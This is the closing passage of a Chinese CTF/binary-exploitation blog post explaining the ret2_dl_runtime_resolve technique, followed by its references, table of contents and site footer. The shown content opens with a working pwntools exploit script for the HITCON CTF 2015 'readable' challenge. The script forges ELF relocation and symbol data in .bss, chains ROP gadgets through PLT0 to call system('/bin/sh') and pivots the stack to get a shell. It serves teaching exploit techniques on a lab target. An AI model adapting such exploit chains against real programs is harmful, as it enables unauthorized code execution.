class="number">0x400280</span></span><br><span class="line">DT_STRTAB = <span class="number">0x4002E0</span></span><br><span class="line">DT_VERSYM = <span class="number">0x40031E</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x600910</span></span><br><span class="line">system_got = bss_addr + <span class="number">0x20</span></span><br><span class="line">buff_addr = bss_addr + <span class="number">0x610</span></span><br><span class="line">main_addr = <span class="number">0x400505</span></span><br><span class="line">PLT0 = <span class="number">0x4003D0</span></span><br><span class="line">p_rdi_ret = <span class="number">0x400593</span></span><br><span class="line">leave_ret = <span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reloc_data_addr(0x600F88) = DT_JMPREL(0x400360) + reloc_index(0x155D7)*3*8</span></span><br><span class="line">reloc_index = <span class="number">0x155D7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x600FB0) = DT_SYMTAB(0x400280) + sym_index(0x155E2)*3*8  </span></span><br><span class="line">reloc_data_addr = <span class="number">0x600F88</span></span><br><span class="line">reloc_data = generate_x64_reloc_data(<span class="number">0x155E2</span>,system_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x600FD0) = DT_STRTAB(0x4002E0) + name_offset(0x200CF0)</span></span><br><span class="line">sym_data_addr = <span class="number">0x600FB0</span></span><br><span class="line">sym_data = generate_x64_sym_data(<span class="number">0x200CF0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x600FD0) = sym_data_addr(0x600FB0) + 0x20</span></span><br><span class="line">func_name_addr = <span class="number">0x600FD0</span></span><br><span class="line">func_name = <span class="string">"system\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x600FE0) = func_name_addr(0x600FD0) + 0x10</span></span><br><span class="line">binsh_str_addr = <span class="number">0x600FE0</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data_to_address</span><span class="params">(address,data)</span>:</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Data length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = data.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Payload length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 'A'*0x10---RBP---ret_addr  buffer的地址使用RBP-0x10算出</span></span><br><span class="line">        <span class="comment"># raw_input('---------Adjust buffer address---------')</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(address + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># raw_input('-------------Send payload-------------')</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr)) <span class="comment"># 每次只能往内存中写0x10字节数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># modify versym dynamic addr(.gnu.version) </span></span><br><span class="line">    <span class="comment"># DT_VERSYM(0x40031E) - sym_index(0x155E2)*2 = 0x3D575A or 0x6006F0 - sym_index(0x155E2)*2 = 0x5D5B2C</span></span><br><span class="line">    <span class="comment"># raw_input('---------[1] Before modify versym dynamic address---------')</span></span><br><span class="line">    write_data_to_address(<span class="number">0x600858</span>,p64(<span class="number">0x6FFFFFF0</span>) + p64(<span class="number">0x3D575A</span>)) <span class="comment"># versym + sym_index*2 可被访问</span></span><br><span class="line">    <span class="comment"># raw_input('---------[2] Before send reloc_data---------')</span></span><br><span class="line">    write_data_to_address(reloc_data_addr,reloc_data)</span><br><span class="line">    <span class="comment"># raw_input('---------[3] Before send sym_data---------')</span></span><br><span class="line">    write_data_to_address(sym_data_addr,sym_data)</span><br><span class="line">    <span class="comment"># raw_input('---------[4] Before send func_name---------')</span></span><br><span class="line">    write_data_to_address(func_name_addr,func_name)</span><br><span class="line">    <span class="comment"># raw_input('---------[5] Before send binsh_str---------')</span></span><br><span class="line">    write_data_to_address(binsh_str_addr,binsh_str)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(p_rdi_ret) + p64(binsh_str_addr)	<span class="comment"># "/bin/sh"</span></span><br><span class="line">    shellcode += p64(PLT0) + p64(reloc_index)</span><br><span class="line">    write_data_to_address(buff_addr,shellcode) <span class="comment">#</span></span><br><span class="line">    <span class="comment"># raw_input('-------------Before send adjust rsp code-------------')</span></span><br><span class="line">    io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><span id="Ref1">[ 01 ]：程序员的自我修养—链接、装载与库</span><br><span id="Ref2">[ 02 ]：<a href="https://blog.csdn.net/u011298001/article/details/84951584" target="_blank" rel="noopener">ELF文件系列第五篇ELF文件静态结构中的重定位项</a></span><br><span id="Ref3">[ 03 ]：<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener">glibc/elf/elf.h</a></span><br><span id="Ref4">[ 04 ]：<a href="https://www.cnblogs.com/vo1ad0r/p/11585025.html" target="_blank" rel="noopener">聊聊动态链接和dl_runtime_resolve</a></span><br><span id="Ref5">[ 05 ]：Linux二进制分析</span><br><span id="Ref6">[ 06 ]：<a href="https://xz.aliyun.com/t/6364" target="_blank" rel="noopener">dl-resolve浅析</a></span><br><span id="Ref7">[ 07 ]：<a href="https://bbs.ichunqiu.com/thread-44816-1-1.html" target="_blank" rel="noopener">Linux pwn入门教程(10)——针对函数重定位流程的几种攻击</a></span><br><span id="Ref8">[ 08 ]：<a href="https://blog.csdn.net/qq_36495104/article/details/106061223" target="_blank" rel="noopener">详细解析ret2_dl_runtime_resolve</a></span><br><span id="Ref9">[ 09 ]：<a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-26.html" target="_blank" rel="noopener">Oracle® Solaris 11.2 链接程序和库指南</a></span><br><span id="Ref10">[ 10 ]：<a href="https://blog.csdn.net/jazrynwong/article/details/89851640" target="_blank" rel="noopener">glibc动态链接器dl_runtime_resolve简要分析</a></span><br><span id="Ref11">[ 11 ]：<a href="https://blog.csdn.net/lzshlzsh/article/details/6066628" target="_blank" rel="noopener">Linux下库函数动态链接过程分析－结合glibc-2.11源码</a></span><br><span id="Ref12">[ 12 ]：<a href="https://forum.90sec.com/t/topic/260" target="_blank" rel="noopener">ret2dl x64 &amp; x32的差异</a></span><br><span id="Ref13">[ 13 ]：<a href="https://blog.csdn.net/seaaseesa/article/details/104478081" target="_blank" rel="noopener">ret2dl-runtime-resolve详细分析(32位&amp;64位)</a></span></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
        <p><span>发布时间:</span>2020-08-15, 00:00</p>
        <p><span>最后更新:</span>2021-09-11, 16:06</p>
        
            <p>
                <span>更新历史:</span><i class="fa fa-github"></i>
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-08-15.ret2_dl_runtime_resolve详解.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-08-15.ret2_dl_runtime_resolve详解.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2020-08-15.ret2_dl_runtime_resolve详解.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
            </p>
        
        <p>
            <span>原始链接:</span><a class="post-url" href="/2020/08/15/ret2_dl_runtime_resolve详解/" title="ret2_dl_runtime_resolve详解">http://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve详解/</a>
            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve详解/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>

    
    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2020/12/20/CVE-2010-3333复现与分析/">
                    CVE-2010-3333复现与分析
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">
                    RCTF2015——WriteUp(Pwn)
                </a>
            </div>
        
    </nav>

  
</article>






    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、延迟绑定"><span class="toc-text">1、延迟绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1、延迟绑定的实现"><span class="toc-text">1.1、延迟绑定的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-1、PLT的基本原理"><span class="toc-text">1.1.1、PLT的基本原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-2、PLT的真正实现"><span class="toc-text">1.1.2、PLT的真正实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、动态链接相关结构"><span class="toc-text">2、动态链接相关结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0、标准ELF变量类型"><span class="toc-text">2.0、标准ELF变量类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1、“-interp”节"><span class="toc-text">2.1、“.interp”节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2、“-dynamic”节"><span class="toc-text">2.2、“.dynamic”节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3、“-rel-dyn”节和“-rel-plt”节"><span class="toc-text">2.3、“.rel.dyn”节和“.rel.plt”节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4、“-got”节和“-got-plt”节"><span class="toc-text">2.4、“.got”节和“.got.plt”节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5、“-dynsym”节"><span class="toc-text">2.5、“.dynsym”节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6、“-dynstr”节"><span class="toc-text">2.6、“.dynstr”节</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、ret2-dl-runtime-resolve利用原理"><span class="toc-text">3、ret2_dl_runtime_resolve利用原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1、函数调用流程"><span class="toc-text">3.1、函数调用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程"><span class="toc-text">3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-0、link-map结构体定义"><span class="toc-text">3.2.0、link_map结构体定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1、-dl-runtime-resolve-的内容"><span class="toc-text">3.2.1、_dl_runtime_resolve()的内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2、-dl-fixup-的内容"><span class="toc-text">3.2.2、_dl_fixup()的内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、真题解析"><span class="toc-text">4、真题解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-0、ret2-dl-runtime-resolve适用情况"><span class="toc-text">4.0、ret2_dl_runtime_resolve适用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1、ret2-dl-runtime-resolve利用方式"><span class="toc-text">4.1、ret2_dl_runtime_resolve利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2、x86的情况——SCTF2014-Pwn200"><span class="toc-text">4.2、x86的情况——SCTF2014  Pwn200</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、检查程序开启的保护机制"><span class="toc-text">1、检查程序开启的保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、静态分析"><span class="toc-text">2、静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、方法一：使用题目提供的libc库，进行利用"><span class="toc-text">3、方法一：使用题目提供的libc库，进行利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用"><span class="toc-text">4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3、x64的情况——HITCON-CTF-2015–readable"><span class="toc-text">4.3、x64的情况——HITCON CTF 2015–readable</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0、x86情况与x64情况的不同之处"><span class="toc-text">0、x86情况与x64情况的不同之处</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1、检查程序开启的保护机制-1"><span class="toc-text">1、检查程序开启的保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、静态分析-1"><span class="toc-text">2、静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0"><span class="toc-text">3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、方法二：使用ret2-dl-runtime-resolve方式进行利用"><span class="toc-text">4、方法二：使用ret2_dl_runtime_resolve方式进行利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
    </script>



    
    <div class="share">
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"ret2_dl_runtime_resolve详解　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>




    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = 'http://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve详解/';
            this.page.identifier = '2020/08/15/ret2_dl_runtime_resolve详解/';
        };
        var loadComment = function() {
            var d = document, s = d.createElement('script');
            s.src = '//Sp4n9x.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <aside class="comment-bar">
        <a href="javascript:void(0);">
            <i class="fa fa-commenting-o animated infinite pulse"></i>
            <i class="fa fa-spinner fa-pulse"></i>
            <span class="count-comment"></span>
        </a>
    </aside>

    <script>
        var $commentBar = $("#comments aside.comment-bar");
        var load$hide = function(){
            $commentBar.find("a > i").toggle();
            loadComment();
            $commentBar.fadeOut(800);
        }
        $commentBar.click(function(){
            load$hide();
        })
        $commentBar.children("a").hover(function(){
            load$hide();
        })
        if (window.location.hash === "#comments") {
            load$hide();
        }
    </script>

</section>


<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
<span class="disqus-comment-count" data-disqus-identifier="2020/08/15/ret2_dl_runtime_resolve详解/"></span>
<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve详解/"></span>
<script>
    $(".disqus-comment-count").hide();
    var $disqusCount = $(".disqus-comment-count");
    $disqusCount.bind("DOMNodeInserted", function(e) {
        $(".count-comment").text(
            $(this).text().replace(/[^0-9]/ig,"")
        )
        DISQUSWIDGETS.getCount({reset: true});
    })
</script>

    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2020/12/20/CVE-2010-3333复现与分析/" title="上一篇: CVE-2010-3333复现与分析">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2020/07/19/RCTF2015——WriteUp(Pwn)/" title="下一篇: RCTF2015——WriteUp(Pwn)">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/14/TEB_and_PEB/">TEB和PEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/22/BlackHat USA 2010 - Understanding the Low Fragmentation Heap/">翻译 - BlackHat USA 2010 - Understanding the Low Fragmentation Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/16/CVE-2012-1876复现与分析/">CVE-2012-1876复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/10/CVE-2010-2553复现与分析/">CVE-2010-2553复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/AVI文件格式分析/">AVI文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2021 Sp4n9x
            </div>
            <div class="footer-right">
                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 10;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
             post: ".article-entry a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    <!-- 点击爱心效果 -->
    <script src="/js/love.js"></script>
  </div>
</body>
</html>